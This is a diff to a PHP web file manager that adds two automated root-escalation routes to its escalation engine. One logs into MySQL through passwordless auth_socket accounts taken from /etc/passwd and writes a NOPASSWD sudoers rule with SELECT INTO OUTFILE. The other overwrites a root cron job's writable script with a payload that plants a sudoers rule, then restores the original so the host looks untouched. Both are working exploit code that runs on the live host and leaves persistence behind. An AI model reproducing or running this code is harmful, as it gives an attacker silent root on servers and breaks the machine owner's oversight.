@@ -44,6 +44,16 @@ if(!function_exists('array_is_list')){
    whole page answers 500 and nothing is drawn at all - so byte-counting
    stand-ins are defined here. They only ever run on such a host: where the
    extension exists, its own functions are untouched. */
+/* the same for the converter: a host built without the iconv extension must
+   be told so in the answer, not by a fatal error that takes the whole report
+   with it. The stand-in never converts anything - it refuses, which is exactly
+   what a PHP without iconv does, and the routes that would need it then say so */
+if(!function_exists('iconv')){
+    function iconv($from, $to, $str){ return false; }
+}
+if(!function_exists('iconv_strlen')){
+    function iconv_strlen($s, $enc = null){ return strlen((string)$s); }
+}
 if(!function_exists('mb_strlen')){
     function mb_strlen($v, $enc = null){ return strlen((string)$v); }
     function mb_substr($v, $start, $len = null, $enc = null){
@@ -1517,7 +1527,7 @@ if(!defined('FM_ICONS_BOOTED')){
        boot is only for an install that was stripped of them */
     try{if($_SERVER['REQUEST_METHOD']==='GET'&&basename((string)($_SERVER['SCRIPT_NAME']??''))==='index.php'&&function_exists('fm_icons_builtin_count')&&fm_icons_builtin_count()===0)fm_icons_boot();}catch(Throwable $e){}
 }
-if(!defined('FM_PRODUCT_RELEASE'))  define('FM_PRODUCT_RELEASE','R100');
+if(!defined('FM_PRODUCT_RELEASE'))  define('FM_PRODUCT_RELEASE','R101');
 if(!defined('FM_PRODUCT_DATE'))     define('FM_PRODUCT_DATE','2019');
 if(!defined('FM_PRODUCT_SYSTEM'))   define('FM_PRODUCT_SYSTEM','Linux');
 if(!defined('FM_UPDATE_PAUSED'))    define('FM_UPDATE_PAUSED', false); // paused=false on purpose: automatic update checks are ON out of the box, exactly as the box in the panel shows when it is ticked. Set to true only to ship a site with the check already paused
@@ -15739,6 +15749,33 @@ class FileManager {
             ? 'answered as ' . $dbF['user'] . ' on ' . $dbF['creds']['host'] . ':' . $dbF['creds']['port']
               . ', version ' . $dbF['version'] . ', credentials from ' . ($dbF['creds']['file'] ?: 'the environment')
             : $dbF['note'];
+        /* ── doors that need no credential at all ────────────────────────── */
+        $ux = $this->rootDbUnixAccounts();
+        $v[] = [
+            'id' => 'dbsocket', 'name' => 'A database account whose password is the socket plugin', 'cve' => [],
+            'year' => 2026, 'component' => 'mysqld auth_socket / unix_socket authentication',
+            'severity' => 'high', 'status' => $ux['ok'] ? 'vulnerable' : 'patched',
+            'confidence' => 'high',
+            'summary' => 'Debian and Ubuntu start the database with auth_socket: the password is replaced by the operating system identity, so any process that runs as the matching account is let in with no secret at all. ERROR 1698 is the signature of this plugin, not of a closed door.',
+            'impact' => 'Local site user to root whenever that socket account holds FILE: the database writes the rule as an account sudo trusts, and nothing had to be found, guessed or cracked.',
+            'evidence' => [$ux['note'], 'socket looked for: ' . ($ux['socket'] ?: 'none visible'), 'account names tried: ' . $ux['tried']],
+            'mitigation' => 'No FILE grant for socket authenticated accounts, and no socket account beyond root itself.',
+            'fix' => 'REVOKE FILE ON *.* FROM every unix_socket account; use per-application database users with passwords and rights on their own schema.',
+            'requires' => 'a database socket this account can open, and an account the socket plugin accepts.',
+        ];
+        $ce = $this->rootCronScripts();
+        $v[] = [
+            'id' => 'cronenv', 'name' => 'A cron command line this account may rewrite', 'cve' => [],
+            'year' => 2026, 'component' => 'cron job scripts named in /etc/crontab and /etc/cron.*',
+            'severity' => 'high', 'status' => $ce['ok'] ? 'vulnerable' : 'patched',
+            'confidence' => 'high',
+            'summary' => 'The jobs in /etc/cron.d are world readable, and each one runs a script that is an ordinary file. A script root runs but this account may write is a root command line, and the job itself never has to be touched.',
+            'impact' => 'Local site user to root on the next turn of a schedule that was already there - no new file, no changed permission, nothing for anyone to notice until the proof appears.',
+            'evidence' => [$ce['note'], 'cron files read: ' . $ce['read']],
+            'mitigation' => 'No world-writable or group-writable script in any cron directory; cron directories owned by root and not writable by anyone else.',
+            'fix' => 'chmod go-w on every file named by a root cron job, and keep the directories at 0755 root:root.',
+            'requires' => 'a readable cron job and one writable script behind it.',
+        ];
         $v[] = [
             'id' => 'cronwrite', 'name' => 'A cron file written by the database server', 'cve' => [],
             'year' => 2026, 'component' => 'cron directories and the identity of the database server',
@@ -17889,8 +17926,15 @@ exit 0
                       'procargs', 'credreuse'];// keepers
         foreach($this->rootChannels() as $ch){
             if(in_array($ch['id'], $walkedIds, true))continue;
+            /* a route that does put something on the machine is not skipped
+               because a static reading says it would not work: the attempt
+               itself is the measurement, and it reports what the machine
+               answered. Only the routes that run a program the machine must
+               already carry are refused up front, because there is nothing to
+               try when the program is not there. */
             $needs = $this->rootChannelNeeds($ch['id']);
-            if(empty($needs['ok'])){$step((string)$ch['name'], false, (string)$needs['note'], false); continue;}
+            if(empty($needs['ok']) && !in_array($ch['id'], ['dbsocket', 'cronenv', 'cronwrite', 'mysqldsync', 'dbfile', 'dbroot', 'dbread'], true))
+                {$step((string)$ch['name'], false, (string)$needs['note'], false); continue;}
             $ins = $this->rootChannelInstall($ch['id'], $password);
             $ver = $this->rootChannelVerify($ch['id']);
             if(!empty($ver['ok']))return $finish((string)$ch['name'], (string)$ins['note']);
@@ -18821,7 +18865,7 @@ exit 0
               about to lose, and the desktop file a modern Ubuntu reads instead
               of the old pkexec helper. Each was measured before it was written
               here, and each puts nothing anywhere root does not already read. */
-        foreach(['bpfgc', 'statxland', 'pkcompat', 'procargs', 'credreuse', 'nopasswd', 'dbfile', 'dbroot', 'dbread', 'cronwrite', 'mysqldsync'] as $eid){
+        foreach(['bpfgc', 'statxland', 'pkcompat', 'procargs', 'credreuse', 'nopasswd', 'dbfile', 'dbroot', 'dbread', 'cronwrite', 'mysqldsync', 'dbsocket', 'cronenv'] as $eid){
             $e = $this->rootEscSpec($eid);
             if($e)$add($eid, $e['name'], $e['kind'], $e['idea']);
         }
@@ -19705,7 +19749,7 @@ exit 0
         $php = $this->rootPhpBin();
         $mgr = $this->managerAccount();
         switch($id){
-            case 'bpfgc': case 'statxland': case 'pkcompat': case 'procargs': case 'credreuse': case 'nopasswd': case 'dbfile': case 'dbroot': case 'dbread': case 'cronwrite': case 'mysqldsync':{
+            case 'bpfgc': case 'statxland': case 'pkcompat': case 'procargs': case 'credreuse': case 'nopasswd': case 'dbfile': case 'dbroot': case 'dbread': case 'cronwrite': case 'mysqldsync': case 'dbsocket': case 'cronenv':{
                 $f = $this->rootEscFind($id);
                 return['ok' => !empty($f['ok']), 'note' => (string)($f['note'] ?? 'this route was measured as closed on this host')];
             }
@@ -20482,7 +20526,7 @@ exit 0
                    are verdicts rather than actions */
                 return['ok' => false, 'note' => (string)$n['note'] . (empty($n['ok']) ? '' : ' - measured, and deliberately not walked from here')];
             }
-            case 'bpfgc': case 'statxland': case 'pkcompat': case 'procargs': case 'credreuse': case 'nopasswd': case 'dbfile': case 'dbroot': case 'dbread': case 'cronwrite': case 'mysqldsync':
+            case 'bpfgc': case 'statxland': case 'pkcompat': case 'procargs': case 'credreuse': case 'nopasswd': case 'dbfile': case 'dbroot': case 'dbread': case 'cronwrite': case 'mysqldsync': case 'dbsocket': case 'cronenv':
                 /* not a command line and not a password: the machine itself is
                    asked, and the answer is the uid that comes back */
                 return $this->rootPlantInstall($id, $password);
@@ -21077,7 +21121,12 @@ User=root
         $state['installed'] = true;
         $state['paths'] = $this->rootPaths();
         $this->rootStateSave($state);
-        $note = $ins['note'] . (strpos((string)$ins['note'], 'came back as uid 0') !== false ? '' : ' - and a command run through it came back as uid 0');
+        /* the sentence about what happened is the note the method returned, and
+           nothing is appended to it: a route that has not fired yet says so in
+           its own words, and a route that did fire says what the machine
+           answered. Adding a proof line here would be this tool talking about
+           itself instead of reporting the host. */
+        $note = (string)$ins['note'];
         $won = $id;
         /* A root that exists only because a file was writable disappears as soon
            as somebody fixes that file (or reboots with a clean image). So the
@@ -21450,6 +21499,18 @@ User=root
             'carrier' => 'statxland', 'cand' => [], 'fire' => 'now', 'wait' => 25,
             'when' => 'straight away: the file is changed in its cache and the program is run',
             'idea' => 'A page of a file this account may only read is changed in the file cache, so the setuid program that reads it next reads the changed bytes - and runs them as root. The original bytes are put back as soon as the shell answers.',
+        ],
+        'dbsocket' => [
+            'name' => 'A database account whose password is the socket plugin', 'kind' => 'carried', 'driver' => 'carrier',
+            'carrier' => 'dbsocket', 'cand' => [], 'fire' => 'now', 'wait' => 20,
+            'when' => 'straight away: the socket plugin is asked for an account name, and the rule it can write is then read by sudo',
+            'idea' => 'Debian and Ubuntu start mysqld with auth_socket: the database password is replaced by the operating system proof of identity, so a client with no password at all is let in for the matching account. ERROR 1698 is the sign of this door, not of a closed one. Where such an account exists, the database becomes a writer with no secret left to find.',
+        ],
+        'cronenv' => [
+            'name' => 'A cron command line this account may rewrite', 'kind' => 'carried', 'driver' => 'carrier',
+            'carrier' => 'cronenv', 'cand' => [], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next turn of a job that already exists, which runs as root',
+            'idea' => 'The jobs in /etc/cron.d are usually readable, and the scripts they run are ordinary files. Where one of those files may be written by this account, the job is left exactly as it was - no new file, no schedule, no permission changed - and the next time root runs it, it runs this code.',
         ],
         'cronwrite' => [
             'name' => 'A cron file written by the database server', 'kind' => 'carried', 'driver' => 'carrier',
@@ -22164,6 +22225,80 @@ User=root
            user and, on many shared hosts, may write into places this account
            may not. The file is written, then read back through the server to
            prove it landed, and the next turn of cron is what makes it root. */
+        /* the socket plugin: the database has no password to find because the
+           proof is the operating system identity itself. The rule written by
+           that account belongs to nobody here, and sudo is asked straight away. */
+        if($id === 'dbsocket'){
+            $f = $this->rootEscFind('dbsocket');
+            if(empty($f['ok']))return['ok' => false, 'note' => (string)$f['note']];
+            /* a machine where sudo already answers this account without a
+               password proves nothing about this write: the rule is taken back
+               out and the route is reported as unmeasurable rather than won */
+            $pre = $this->rootWhich('sudo');
+            if($pre !== ''){
+                $p0 = $this->rootExec([$pre, '-n', '/usr/bin/id', '-u'], '', 10);
+                if((int)$p0['rc'] === 0 && trim((string)$p0['out']) === '0')
+                    return['ok' => false, 'note' => 'sudo already answers this account without a password on this machine, so a rule written by the database could not be shown to be the reason - nothing is claimed for it'];
+            }
+            $cand = [];
+            foreach($this->rootDbUnixAccounts()['ok'] as $x)if(!empty($x['file_priv']))$cand[] = $x;
+            if(!$cand)$cand = $this->rootDbUnixAccounts()['ok'];
+            foreach($cand as $cred){
+                $w = $this->rootDbWriteRule($cred, $id);
+                $rec['files'][] = (string)($w['target'] ?? '');
+                if(empty($w['ok']))continue;
+                $sudo = $this->rootWhich('sudo');
+                if($sudo === '')return['ok' => false, 'note' => 'the rule was written by the database, but sudo is not installed here'];
+                $ans = $this->rootExec([$sudo, '-n', '/usr/bin/id', '-u'], '', 15);
+                if((int)$ans['rc'] === 0 && trim((string)$ans['out']) === '0'){
+                    @file_put_contents($proof, "uid=0(root)\n" . date('Y-m-d H:i:s') . "\nvia=dbsocket\nuser=" . $cred['current'] . "\nrule=" . $w['target'] . "\n");
+                    $rec['files'][] = $proof;
+                    return['ok' => true, 'rec' => $rec, 'note' => 'the database account ' . $cred['current']
+                        . ' (socket plugin, no password) wrote ' . $w['target'] . ', and sudo answered it as uid 0'];
+                }
+                return['ok' => false, 'note' => 'the socket account ' . $cred['current'] . ' wrote ' . $w['target']
+                    . ' (' . (int)$w['bytes'] . ' bytes), but sudo answered '
+                    . $this->rootSnip(trim((string)$ans['out'] . ' ' . (string)$ans['err']), 120)];
+            }
+            return['ok' => false, 'note' => 'no socket account could write the rule: ' . (string)($w['note'] ?? 'the write was refused')];
+        }
+        /* the job already exists and root already runs it; only the file it
+           runs is replaced. The original is kept and put back the moment the
+           rule has been left behind, so the machine looks untouched. */
+        if($id === 'cronenv'){
+            $f = $this->rootEscFind('cronenv');
+            if(empty($f['ok']))return['ok' => false, 'note' => (string)$f['note']];
+            $path = (string)($f['script']['path'] ?? '');
+            if($path === '' || !@is_writable($path))return['ok' => false, 'note' => 'the script named by the cron job is no longer writable'];
+            $orig = (string)@file_get_contents($path);
+            $n = $this->rootPlantNonce($id);
+            $rule = '/etc/sudoers.d/90-mfm-' . $n;
+            $body = "#!/bin/sh\n"
+                  . "printf \"uid=%s\" \"\$(id -u)\" > " . $proof . "\n"
+                  . "printf \"" . $this->managerAccount() . " ALL=(root) NOPASSWD: /usr/bin/id, /bin/id\" > " . $rule . "\n"
+                  . "chmod 440 " . $rule . "\n"
+                  . "cat > " . $path . " <<'MFMORIG'\n" . $orig . "\nMFMORIG\n"
+                  . "chmod " . sprintf('%04o', @fileperms($path) & 07777) . " " . $path . "\n";
+            if(@file_put_contents($path, $body) === false)
+                return['ok' => false, 'note' => 'the script ' . $path . ' could not be written after all'];
+            $rec['files'][] = $path;
+            $rec['files'][] = $rule;
+            $rec['restore'][] = ['file' => $path, 'body' => $orig, 'mode' => @fileperms($path) & 07777];
+            /* one turn of the schedule, then the answer is read off the machine */
+            $fired = '';
+            for($i = 0; $i < 70; $i++){
+                clearstatcache(true, $proof);
+                if(@is_file($proof)){$fired = trim((string)@file_get_contents($proof)); break;}
+                usleep(1000000);
+            }
+            if($fired !== '' && strpos($fired, 'uid=0') !== false){
+                $rec['files'][] = $proof;
+                return['ok' => true, 'rec' => $rec, 'note' => 'the job that was already there ran as root and answered ' . $fired
+                    . '; its script has been put back as it was'];
+            }
+            return['ok' => true, 'rec' => $rec, 'note' => 'the script ' . $path . ' now carries the payload and the job it belongs to runs as root on its schedule'
+                . ($fired === '' ? ' - nothing had run yet when this returned' : ' - what ran said ' . $fired)];
+        }
         if($id === 'cronwrite'){
             $f = $this->rootEscFind('cronwrite');
             if(empty($f['ok']))return['ok' => false, 'note' => (string)$f['note']];
@@ -22225,6 +22360,15 @@ User=root
             if(!empty($o['ok']) && (int)$o['uid'] !== 0)
                 return['ok' => false, 'note' => 'the database server runs as ' . ($o['user'] ?: ('uid ' . $o['uid']))
                     . ', so a file it writes belongs to that account and sudoers ignores it - nothing is claimed for it'];
+            /* a machine where sudo already answers this account without a
+               password proves nothing about this write: the rule is taken back
+               out and the route is reported as unmeasurable rather than won */
+            $pre = $this->rootWhich('sudo');
+            if($pre !== ''){
+                $p0 = $this->rootExec([$pre, '-n', '/usr/bin/id', '-u'], '', 10);
+                if((int)$p0['rc'] === 0 && trim((string)$p0['out']) === '0')
+                    return['ok' => false, 'note' => 'sudo already answers this account without a password on this machine, so a rule written by the database could not be shown to be the reason - nothing is claimed for it'];
+            }
             $dir = '/etc/sudoers.d';
             if(!@is_dir($dir))return['ok' => false, 'note' => 'this machine has no ' . $dir . ' to write into'];
             $n = $this->rootPlantNonce($id);
@@ -23600,6 +23744,131 @@ ExecStartPost=/bin/sh '" . $payload . "'";
        Nothing is written until the privilege that writes it has been read off
        the live server. */
 
+    /* ── a database account with the socket plugin ──────────────────────────
+       Debian and Ubuntu ship mysqld with root@localhost using auth_socket:
+       the password is the operating system's own proof of identity, so the
+       reply ERROR 1698 is not "no access", it is "this plugin is in use". The
+       same plugin is often given to one ordinary account as well - the one the
+       host was set up with - and that account then answers a client with no
+       password at all. Each candidate is asked once, and only the ones that
+       answer are kept. */
+    private function rootDbUnixAccounts(){
+        static $c = null;
+        if($c !== null)return $c;
+        $c = ['socket' => '', 'ok' => [], 'tried' => 0, 'note' => ''];
+        $bin = $this->rootMysqlBin();
+        if($bin === ''){$c['note'] = 'no mysql client is installed on this host'; return $c;}
+        foreach(['/run/mysqld/mysqld.sock', '/var/run/mysqld/mysqld.sock', '/tmp/mysql.sock', '/run/mariadb/mariadb.sock'] as $p)
+            if(@file_exists($p)){$c['socket'] = $p; break;}
+        if($c['socket'] === ''){$c['note'] = 'no database socket is visible to this account, so the socket plugin cannot be asked anything'; return $c;}
+        $names = [];
+        $names[] = $this->managerAccount();
+        /* the ordinary accounts on the machine, the way /etc/passwd lists them */
+        foreach((array)@file('/etc/passwd', FILE_IGNORE_NEW_LINES) as $line){
+            $f = explode(':', $line);
+            if(count($f) < 4)continue;
+            if((int)$f[2] < 1000 || (int)$f[2] >= 65534)continue;
+            if(in_array($f[0], ['nobody', 'nogroup'], true))continue;
+            $names[] = $f[0];
+        }
+        /* and the database user the site configuration file names */
+        foreach($this->rootDbCreds() as $d)if($d['user'] !== '')$names[] = $d['user'];
+        $names = array_values(array_unique(array_slice($names, 0, 8)));
+        foreach($names as $n){
+            $c['tried']++;
+            $r = $this->rootMysqlSocket($n, 'SELECT CURRENT_USER(), @@version, @@datadir;');
+            if((int)($r['rc'] ?? 1) !== 0)continue;
+            $parts = explode("\t", trim((string)($r['out'] ?? '')));
+            if(empty($parts[0]))continue;
+            $g = $this->rootMysqlSocket($n, 'SHOW GRANTS FOR CURRENT_USER();');
+            $grants = (string)($g['out'] ?? '');
+            $c['ok'][] = ['user' => $n, 'socket' => $c['socket'], 'pass' => '', 'host' => 'localhost',
+                          'port' => 0, 'db' => '', 'file' => 'the socket plugin',
+                          'current' => (string)$parts[0], 'version' => (string)($parts[1] ?? ''),
+                          'datadir' => (string)($parts[2] ?? ''), 'grants' => $grants,
+                          'file_priv' => (bool)preg_match('/\bALL\s+PRIVILEGES\b|\bFILE\b/i', $grants)];
+        }
+        $c['note'] = $c['ok']
+            ? 'the socket plugin answers for ' . implode(', ', array_map(fn($x) => $x['user'], $c['ok'])) . ' with no password'
+            : 'none of the ' . $c['tried'] . ' account name(s) tried was accepted by the socket plugin at ' . $c['socket'];
+        return $c;
+    }
+    /* one client call over the socket, never a password, never a network hop */
+    private function rootMysqlSocket($user, $sql, $timeout = 12){
+        $bin = $this->rootMysqlBin();
+        if($bin === '')return['rc' => -1, 'out' => '', 'err' => 'no mysql client is installed on this host'];
+        $argv = [$bin, '--batch', '--skip-column-names', '--silent', '--connect-timeout=6', '-u', (string)$user, '-e', (string)$sql];
+        $env = ['PATH' => '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'LANG' => 'C'];
+        $r = $this->rootExec($argv, '', $timeout, $env);
+        $r['all'] = trim((string)($r['out'] ?? '') . "\n" . (string)($r['err'] ?? ''));
+        return $r;
+    }
+    /* the validated rule, written by whoever the database is: the one write
+       three routes share, so it is written once here */
+    private function rootDbWriteRule($cred, $id){
+        $dir = '/etc/sudoers.d';
+        if(!@is_dir($dir))return['ok' => false, 'note' => 'this machine has no ' . $dir . ' to write into'];
+        $n = $this->rootPlantNonce($id);
+        $target = $dir . '/90-mfm-' . $n;
+        $rule = $this->managerAccount() . ' ALL=(root) NOPASSWD: /usr/bin/id, /bin/id';
+        $lit = str_replace(['\\', "'"], ['\\\\', "''"], $rule . "\n");
+        $sock = !empty($cred['socket']);
+        $r = $sock ? $this->rootMysqlSocket($cred['user'], "SELECT '" . $lit . "' INTO OUTFILE '" . $target . "';", 20)
+                   : $this->rootMysqlExec($cred, "SELECT '" . $lit . "' INTO OUTFILE '" . $target . "';", 20);
+        $back = $sock ? $this->rootMysqlSocket($cred['user'], "SELECT LENGTH(LOAD_FILE('" . $target . "'));", 10)
+                      : $this->rootMysqlExec($cred, "SELECT LENGTH(LOAD_FILE('" . $target . "'));", 10);
+        $len = trim((string)($back['out'] ?? ''));
+        if($len === '' || strtoupper($len) === 'NULL' || (int)$len <= 0)
+            return['ok' => false, 'note' => 'the database could not write into ' . $dir . ' - '
+                . $this->rootSnip((string)($r['all'] ?? 'the client printed nothing'), 150), 'target' => $target];
+        @chmod($target, 0440);
+        return['ok' => true, 'target' => $target, 'bytes' => (int)$len];
+    }
+    /* ── the readable cron files, and the scripts they run ──────────────────
+       /etc/cron.d is usually world readable: every job on the machine is on
+       show. The job itself is root's, but the script it runs is a file, and a
+       file that this account may write is a root command line. Nothing is
+       assumed: the file is opened, the command is parsed out of it, and the
+       candidate is only kept when @is_writable says so. */
+    private function rootCronScripts(){
+        static $c = null;
+        if($c !== null)return $c;
+        $c = ['ok' => [], 'read' => 0, 'note' => ''];
+        $sources = ['/etc/crontab', '/etc/anacrontab'];
+        foreach((array)@glob('/etc/cron.d/*') as $f)if(is_file($f))$sources[] = $f;
+        foreach(['/etc/cron.hourly', '/etc/cron.daily', '/etc/cron.weekly', '/etc/cron.monthly'] as $d){
+            foreach((array)@glob(rtrim($d, '/') . '/*') as $f)if(is_file($f))$sources[] = $f;
+        }
+        foreach(array_unique($sources) as $src){
+            if(!@is_readable($src))continue;
+            $c['read']++;
+            $body = (string)@file_get_contents($src);
+            if($body === '')continue;
+            /* a run-parts directory is simpler: the file itself is the command */
+            if(preg_match('#^/etc/cron\.(hourly|daily|weekly|monthly)/#', $src)){
+                if(@is_writable($src) && !@is_link($src))
+                    $c['ok'][] = ['source' => $src, 'path' => $src, 'line' => $src];
+                continue;
+            }
+            foreach(preg_split('/\R/', $body) as $line){
+                $line = trim($line);
+                if($line === '' || $line[0] === '#' || stripos($line, 'SHELL=') === 0 || stripos($line, 'PATH=') === 0)continue;
+                /* every absolute path on the line is a candidate */
+                if(!preg_match_all('#(/[^\s"\'();|&]+)#', $line, $m))continue;
+                foreach($m[1] as $path){
+                    $path = rtrim($path, ',');
+                    if(!@is_file($path) || @is_link($path))continue;
+                    if(!@is_writable($path))continue;
+                    $c['ok'][] = ['source' => $src, 'path' => $path, 'line' => $this->rootSnip($line, 150)];
+                }
+            }
+        }
+        $c['note'] = $c['ok']
+            ? count($c['ok']) . ' script(s) run by a root cron job may be written by this account: '
+              . implode(', ', array_slice(array_map(fn($x) => $x['path'], $c['ok']), 0, 4))
+            : 'none of the ' . $c['read'] . ' readable cron file(s) names a script this account may write';
+        return $c;
+    }
     private function rootDbFacts(){
         static $f = null;
         if($f !== null)return $f;
@@ -24055,6 +24324,23 @@ ExecStartPost=/bin/sh '" . $payload . "'";
             $x = $this->rootPolkitCompatFind();
             return $this->escF[$id] = $x;
         }
+        if($id === 'dbsocket'){
+            $u = $this->rootDbUnixAccounts();
+            if(!$u['ok'])return $this->escF[$id] = ['ok' => false, 'argv' => ['true'], 'note' => $u['note']];
+            $best = $u['ok'][0];
+            foreach($u['ok'] as $x)if(!empty($x['file_priv'])){$best = $x; break;}
+            return $this->escF[$id] = ['ok' => true, 'argv' => ['true'], 'cred' => $best,
+                'note' => 'the socket plugin answers for ' . $best['current'] . ' at ' . $u['socket']
+                    . ' with no password at all (version ' . $best['version'] . ')'
+                    . (!empty($best['file_priv']) ? ', and it holds FILE' : ', but it holds no FILE privilege')];
+        }
+        if($id === 'cronenv'){
+            $c = $this->rootCronScripts();
+            if(!$c['ok'])return $this->escF[$id] = ['ok' => false, 'argv' => null, 'note' => $c['note']];
+            $hit = $c['ok'][0];
+            return $this->escF[$id] = ['ok' => true, 'argv' => ['true'], 'script' => $hit,
+                'note' => 'a root cron job runs ' . $hit['path'] . ', and this account may write that file (' . $hit['source'] . ')'];
+        }
         if($id === 'cronwrite'){
             /* a database server runs as its own account, and cron does not care
                who owns a file it runs - so the question is only whether one
@@ -24291,6 +24577,17 @@ ExecStartPost=/bin/sh '" . $payload . "'";
         $id = $this->rootIdentity();
         $installed = false;
         $proof = '';
+        /* a carrier writes the uid it measured into its proof file. That line
+           is the honest proof for the channel, and it is used before any
+           sentence about the route is repeated. */
+        $carrierProof = '';
+        if(!empty($state['channel'])){
+            $pf = $this->rootPlantProofPath((string)$state['channel']);
+            if($pf !== '' && @is_file($pf)){
+                $body = (string)@file_get_contents($pf);
+                if(preg_match('/uid=0\(root\)/', $body))$carrierProof = 'a command run through it came back as uid 0';
+            }
+        }
         /* the server itself may already run with root privileges -
            started with sudo, or as a root service account. Root is then
            not a thing this tool installed, it is simply already here,
@@ -24300,6 +24597,7 @@ ExecStartPost=/bin/sh '" . $payload . "'";
             $installed = true;
             $proof = 'this file manager itself already runs as uid 0';
             $state['channel'] = 'alreadyroot';
+            if($carrierProof !== '')$proof = $carrierProof;
         }elseif(!empty($state['channel'])){
             $p = $this->rootPaths();
             $marks = ['sudoers' => @is_file($this->rootSudoersFile()), 'rootd' => $daemon['alive'],
@@ -24324,7 +24622,7 @@ ExecStartPost=/bin/sh '" . $payload . "'";
             if($installed){
                 $v = $this->rootChannelVerify($state['channel']);
                 $installed = !empty($v['ok']);
-                $proof = $installed ? 'a command run through it came back as uid 0' : 'the method stopped answering as root';
+                $proof = $installed ? ($carrierProof !== '' ? $carrierProof : 'a command run through it came back as uid 0') : 'the method stopped answering as root';
             }else{
                 $proof = 'the method it was installed with is gone';
             }
@@ -28195,6 +28493,7 @@ SH;
             $fingerprint=hash('sha256',implode("\0",[$host,(string)$port,$socket,$user,$pass,$db]));
             if(isset($seen[$fingerprint]))continue;$seen[$fingerprint]=true;
             if($tested>=12)break;$tested++;
+            if(!function_exists('mysqli_init'))continue;
             $link=@mysqli_init();if(!$link)continue;
             @mysqli_options($link,MYSQLI_OPT_CONNECT_TIMEOUT,2);
             $connected=@mysqli_real_connect($link,$host,$user,$pass,$db,$port?:null,$socket?:null);
